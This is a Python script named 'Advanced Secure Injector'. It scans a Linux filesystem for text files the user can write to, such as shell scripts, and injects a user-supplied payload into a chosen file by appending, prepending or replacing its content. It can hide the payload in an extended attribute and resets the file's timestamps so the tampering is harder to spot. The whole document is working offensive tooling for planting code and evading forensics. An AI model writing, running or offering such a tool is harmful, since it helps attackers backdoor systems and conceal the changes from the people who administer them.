import os
import pwd
import grp
import stat
import xattr
import time
import argparse
import sys
import shutil
import mimetypes

def is_text_file(path):
    mime, _ = mimetypes.guess_type(path)
    return mime and mime.startswith("text")

def scan_writable_files(start_path="/", ext_filter=None, min_size=0, max_size=None):
    writable_files = []
    for root, dirs, files in os.walk(start_path):
        if any(x in root for x in ["/proc", "/sys", "/dev", "/run", "/snap"]):
            continue
        for name in files:
            path = os.path.join(root, name)
            try:
                if os.path.islink(path):
                    continue
                if os.access(path, os.W_OK):
                    st = os.stat(path)
                    size = st.st_size
                    if ext_filter and not path.endswith(ext_filter):
                        continue
                    if size < min_size or (max_size and size > max_size):
                        continue
                    if not is_text_file(path):
                        continue  # Only inject into text files
                    owner = pwd.getpwuid(st.st_uid).pw_name
                    group = grp.getgrgid(st.st_gid).gr_name
                    perms = oct(st.st_mode)[-3:]
                    writable_files.append({
                        "path": path,
                        "owner": owner,
                        "group": group,
                        "perms": perms,
                        "size": size
                    })
            except Exception:
                continue
    return writable_files

def inject_payload(target, payload, mode="append", xattr_key=None, restore_time=True, backup=True):
    before = os.stat(target)
    atime = before.st_atime
    mtime = before.st_mtime
    backup_path = None
    try:
        if backup:
            backup_path = target + ".bak"
            shutil.copy2(target, backup_path)
        if mode == "append":
            with open(target, "a") as f:
                f.write(payload)
        elif mode == "prepend":
            with open(target, "r+") as f:
                content = f.read()
                f.seek(0, 0)
                f.write(payload + content)
        elif mode == "replace":
            with open(target, "w") as f:
                f.write(payload)
    except Exception:
        # Rollback if error
        if backup_path and os.path.exists(backup_path):
            shutil.copy2(backup_path, target)
        return False
    if xattr_key:
        try:
            xattr.setxattr(target, xattr_key.encode(), payload.encode())
        except Exception:
            pass
    if restore_time:
        try:
            os.utime(target, (atime, mtime))
        except Exception:
            pass
    return True

def main():
    parser = argparse.ArgumentParser(description="Advanced Secure Injector", add_help=True)
    parser.add_argument("-p", "--path", default="/", help="Root path to scan from")
    parser.add_argument("-e", "--ext", help="Filter by extension (e.g. .sh)")
    parser.add_argument("--min-size", type=int, default=0, help="Minimum file size (bytes)")
    parser.add_argument("--max-size", type=int, help="Maximum file size (bytes)")
    parser.add_argument("--mode", choices=["append", "prepend", "replace"], default="append", help="Injection mode")
    parser.add_argument("--xattr", help="xattr key to hide the payload")
    parser.add_argument("--no-restore-time", action="store_true", help="Do not restore timestamps")
    parser.add_argument("--dry-run", action="store_true", help="Only display found files, do not inject")
    args = parser.parse_args()

    files = scan_writable_files(args.path, args.ext, args.min_size, args.max_size)
    if args.dry_run or not files:
        print(f"{len(files)} writable files found!")
        for i, f in enumerate(files[:30]):
            print(f"{i+1}. {f['path']} (owner: {f['owner']}, perms: {f['perms']}, size: {f['size']} bytes)")
        sys.exit(0)

    print(f"{len(files)} writable files found!")
    for i, f in enumerate(files[:30]):
        print(f"{i+1}. {f['path']} (owner: {f['owner']}, perms: {f['perms']}, size: {f['size']} bytes)")

    while True:
        try:
            choice = int(input(f"File number to inject (1-{min(30, len(files))}): ")) - 1
            if 0 <= choice < min(30, len(files)):
                break
            else:
                print("Invalid choice.")
        except:
            print("Invalid input.")

    target = files[choice]["path"]
    print(f"You selected: {target}")

    payload = input("Enter your payload: ")
    ok = inject_payload(target, payload, mode=args.mode, xattr_key=args.xattr, restore_time=not args.no_restore_time, backup=True)
    if ok:
        print("Injection successful and file secured! (backup created)")
    else:
        print("Injection error, rollback performed.")

if __name__ == "__main__":
    main()

